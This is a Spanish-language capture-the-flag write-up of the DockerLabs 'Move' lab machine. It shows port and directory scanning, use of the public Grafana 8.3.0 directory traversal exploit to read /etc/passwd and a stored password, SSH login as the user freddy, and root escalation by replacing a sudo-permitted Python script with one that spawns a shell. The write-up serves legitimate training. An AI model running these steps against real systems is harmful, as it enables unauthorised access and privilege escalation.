
# Move

## <mark style="color:purple;">Despliegue</mark>

```bash
sudo bash auto_deploy.sh move.tar
[sudo] contraseña para kali: 

	                   ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2
```

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP `172.17.0.2` a través del navegador y entramos a la página de configuración de un servidor Apache:

<figure><img src="/files/DMqoUG4gN1KRAYefRMWQ" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -Pn 172.17.0.2   
[sudo] contraseña para kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 14:51 CEST

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Debian))
3000/tcp open  ppp?
```

Solo encontramos 3 puertos abiertos, uno de ellos el puerto 3000 que puede tener algo interesante.

Al entrar llegamos a un panel de login de Grafana y abajo nos encontramos la versión, lo que nos permite buscar algún exploit público:

<figure><img src="/files/3zmDw4FbabkW8TVKoQyv" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Fuzzing</mark>

Fuzzeando con Dirsearch por el puerto 80 nos encontramos un directorio interesante:

```shell-session
afsh4ck@kali$ dirsearch -u http://172.17.0.2 -x 403,404,401 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Target: http://172.17.0.2/

[22:21:34] Starting: 
[22:22:44] 200 -   63B  - /maintenance.html
```

Entramos al directorio `/maintenance.html` y nos encontramos algo muy curioso, nos dice que el acceso está en `/tmp/pass.txt` :

<figure><img src="/files/yEUgKojPcDW59sxcSvAr" alt=""><figcaption></figcaption></figure>

Al intentar acceder no podemos directamente, por lo que tendremos que buscar otra vía.

## <mark style="color:purple;">Búsqueda de exploits</mark>

Utilizando searchsploit nos encontramos con un exploit para explotar un directory traversal y lectura de archivos arbitrarios:

```shell-session
afsh4ck@kali$ searchsploit grafana 8.3.0
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read     | multiple/webapps/50581.py
---------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nos lo copiamos a nuestra ruta actual y probamos el exploit:

```shell-session
afsh4ck@kali$ searchsploit -m multiple/webapps/50581.py
  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50581
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50581.py
    Codes: CVE-2021-43798
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/Escritorio/machines/dockerlabs/move/50581.py
```

## <mark style="color:purple;">Exploit</mark>

Ejecutamos el exploit de la siguiente manera, lo que nos permite acceder a cualquier archivo del sistema, como `/etc/passwd`:

```shell-session
afsh4ck@kali$ python3 50581.py -H http://172.17.0.2:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```

Observamos que hay un usuario `freddy` que es el único usuario junto con root que tienen shell, por lo que nos interesa comprometer a este usuario.

Con este script también vamos a intentar leer el archivo `/tmp/pass.txt` que nos encontramos en la fase de fuzzing:

```shell-session
afsh4ck@kali$ python3 50581.py -H http://172.17.0.2:3000   
Read file > /tmp/pass.txt
t9sH76gpQ82UFeZ3GXZS
```

Buum! Tenemos una contraseña!

## <mark style="color:purple;">Acceso por SSH</mark>

Vamos a intentar acceder por ssh con el usuario freddy y esta contraseña:

```shell-session
afsh4ck@kali$ ssh freddy@172.17.0.2                                      
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:vI77ttzFmsp8NiCsxBpeZipRCZ9MdfkeMJojz7qMiTw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
freddy@172.17.0.2's password: 

freddy@4d075085b685:~$ id     
uid=1000(freddy) gid=1000(freddy) groups=1000(freddy)
```

Estamos dentro!

## <mark style="color:purple;">Escalada de privilegios</mark>

Vamos a elevar nuestros privilegios en el sistema. El primer paso es hacer un `sudo -l` para ver los permisos de ejecución:

```shell-session
freddy@4d075085b685:~$ sudo -l                                                    
Matching Defaults entries for freddy on 4d075085b685:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User freddy may run the following commands on 4d075085b685:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

Vemos que el usuario freddy puede ejecutar con todos los permisos el script `maintenance.py`. Al leer este archivo con cat vemos que es un script que solamente hace un print:

```shell-session
freddy@4d075085b685:~$ cat /opt/maintenance.py                                    
print("Server under beta testing")
```

Entonces para explotar esto vamos a editar el archivo `maintenance.py` añadiéndole unas líneas al final, y dejando un mensajito para decir que hemos pwneado la máquina:

```python
print("H4cked by: afsh4ck")
import os
os.system('/bin/bash')
```

No nos deja editarlo directamente con nano por lo que vamos a editarlo en nuestra máquina de atacante y enviarlo con un servidor local en python y wget:

<figure><img src="/files/ocXgp4EEY9oaeGmHL3kR" alt=""><figcaption></figcaption></figure>

1. Abrimos un servidor local con python en nuestra máquina de atacante
2. Descargamos `maintenance.py` con wget dentro del directorio `/opt`
3. Eliminamos el script original y renombramos el script enviado
4. Ejecutamos el script como `sudo` utilizando la ruta completa

```shell-session
freddy@4d075085b685:~$ sudo /usr/bin/python3 /opt/maintenance.py
H4cked by: afsh4ck
root@4d075085b685:/home/freddy# whoami 
root

root@4d075085b685:/home/freddy# cd /root
root@4d075085b685:~# ls -la
total 40
drwx------ 1 root root  4096 Mar 29  2024 .
drwxr-xr-x 1 root root  4096 Oct  3 20:37 ..
-rw-r--r-- 1 root root  5551 Mar 24  2024 .bashrc
-rw-r--r-- 1 root root   571 Mar 24  2024 .bashrc.original
-rw-r--r-- 1 root root   161 Feb 15  2024 .profile
drwx------ 2 root root  4096 Mar 29  2024 .ssh
-rw-r--r-- 1 root root 10868 Mar 24  2024 .zshrc
```

Y ya somos root!
